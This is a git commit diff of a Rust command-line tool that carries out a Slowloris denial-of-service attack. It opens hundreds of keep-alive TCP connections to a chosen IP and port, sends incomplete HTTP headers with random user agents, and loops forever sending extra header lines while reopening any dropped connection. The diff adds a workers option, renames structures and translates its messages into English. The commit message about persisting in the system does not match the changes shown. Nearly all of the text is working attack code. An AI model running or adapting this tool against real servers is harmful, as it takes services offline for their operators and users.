789607a98a3e6183229c772ae1fd161ac1fb6d2a
Emilien <emilien.cuny0312@gmail.com>
2023-12-17 16:27:45 +0100

    Add command line to persist in system

--- src/main.rs
+++ src/main.rs
@@ -1,45 +1,54 @@
 use std::io::Write;
 use std::net::{IpAddr, SocketAddr, TcpStream};
 use rand::{random, Rng};
-use clap::Parser;
+use clap::{Parser};
 use std::fs;
+use std::path::Path;
 
 #[derive(Parser)]
+#[command(author, version, about)]
 struct Cli {
+    // IP Address targeted
+    ip: IpAddr,
+    // Port targeted
+    port: u16,
+    // Number of workers
+    #[arg(short, long, default_value_t = 500, help="Specify the number of workers")]
+    workers: u16,
+}
+
+struct Worker {
     ip: IpAddr,
     port: u16,
 }
 
-struct Socket {
-    ip: IpAddr,
-    port: u16,
-}
-
-impl Socket {
-    pub fn create(&self, nb_sockets: usize) -> Vec<TcpStream> {
-        let mut sockets = vec![];
-        for _i in 0..nb_sockets {
-            sockets.push(Socket::new_instance(&self));
+impl Worker {
+    pub fn create(&self, nb_workers: u16) -> Vec<TcpStream> {
+        let mut workers = vec![];
+        for _i in 0..nb_workers {
+            workers.push(Worker::new_instance(&self));
         }
-        sockets
+        workers
     }
 
     pub fn new_instance(&self) -> TcpStream {
         let mut s = TcpStream::connect(SocketAddr::new(self.ip, self.port))
-            .expect("Impossible de se connecter");
+            .expect("Impossible to connect to the target.");
         s.write_all(
             format!(
                 "GET /?{} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                 random::<i8>(),
                 random_agent()
             ).as_bytes(),
-        ).expect("Impossible d'envoyer les informations");
+        ).expect("Impossible to send the data to the target.");
         s
     }
 }
 
 fn random_agent () -> String {
-    let file = fs::read_to_string("user-agents.txt").expect("Impossible de lire le fichiers d'agents");
+    let project_root = env!("CARGO_MANIFEST_DIR");
+    let path = Path::new(project_root).join("user-agents.txt");
+    let file = fs::read_to_string(&path).expect("Impossible to read the user-agents file.");
     let agent: Vec<&str> = file.lines().collect();
     let random_line = rand::thread_rng().gen_range(0..agent.len());
 
@@ -47,28 +56,26 @@ fn random_agent () -> String {
 }
 
 fn main () {
-
-    let  nb_sockets: usize = 1000;
-
     let args = Cli::parse();
+    let nb_workers: u16 = args.workers;
 
-    let instance = Socket {
+    let instance = Worker {
         ip: args.ip,
         port: args.port
     };
 
-    println!("Création des sockets...");
+    println!("Making workers...");
 
-    let mut sockets: Vec<TcpStream> = instance.create(nb_sockets);
+    let mut workers: Vec<TcpStream> = instance.create(nb_workers);
 
-    println!("Début de l'attaque Slowloris...");
+    println!("Slowloris attack has begun...");
     loop {
-        for socket in &mut sockets {
-            match socket.write_all(format!("X-a: {}\r\n", random::<i8>()).as_bytes()) {
-                Ok(_) => println!("Réussi !"),
+        for worker in &mut workers {
+            match worker.write_all(format!("X-a: {}\r\n", random::<i8>()).as_bytes()) {
+                Ok(_) => (),
                 Err(_) => {
-                    println!("Erreur : {:?}", socket);
-                    *socket = instance.new_instance();
+                    println!("Recreating worker : {:?}", worker);
+                    *worker = instance.new_instance();
                 },
             };
         }
